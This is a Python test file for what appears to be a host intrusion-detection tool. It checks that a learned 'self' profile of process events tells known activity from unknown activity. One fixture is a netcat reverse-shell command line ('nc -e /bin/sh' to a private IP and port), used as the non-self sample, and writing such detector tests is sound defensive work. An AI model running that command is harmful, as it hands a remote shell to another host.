"""Tests for the self-profile (learning and self/non-self matching)."""

from bluefish.core.events import make_process_event
from bluefish.core.self_profile import SelfProfile


def _proc(name="bash", exe="/bin/bash", user="alice", cmd="bash", pid=1):
    return make_process_event(
        name=name, exe=exe, username=user, cmdline=cmd, pid=pid
    )


def test_untrained_profile_reports_not_trained(store):
    profile = SelfProfile(store)
    assert profile.is_trained() is False
    assert profile.signature_is_self(_proc()) is False


def test_learned_signature_is_self(store):
    profile = SelfProfile(store)
    ev = _proc()
    profile.learn(ev)
    assert profile.is_trained() is True
    assert profile.signature_is_self(ev) is True
    assert profile.is_self(ev) is True


def test_unlearned_signature_is_non_self(store):
    profile = SelfProfile(store)
    profile.learn(_proc(name="bash", exe="/bin/bash"))
    other = _proc(name="nc", exe="/bin/nc", cmd="nc -e /bin/sh 10.0.0.1 4444")
    assert profile.signature_is_self(other) is False
    assert profile.is_self(other) is False


def test_numeric_deviation_grows_with_outliers(store):
    profile = SelfProfile(store, numeric_k=3.0)
    # Learn a stable baseline of short command lines.
    for i in range(30):
        profile.learn(_proc(cmd="ls -la", pid=i))
    baseline = _proc(cmd="ls -la", pid=999)
    outlier = _proc(cmd="x" * 5000, pid=1000)
    assert profile.numeric_deviation(baseline) < profile.numeric_deviation(outlier)
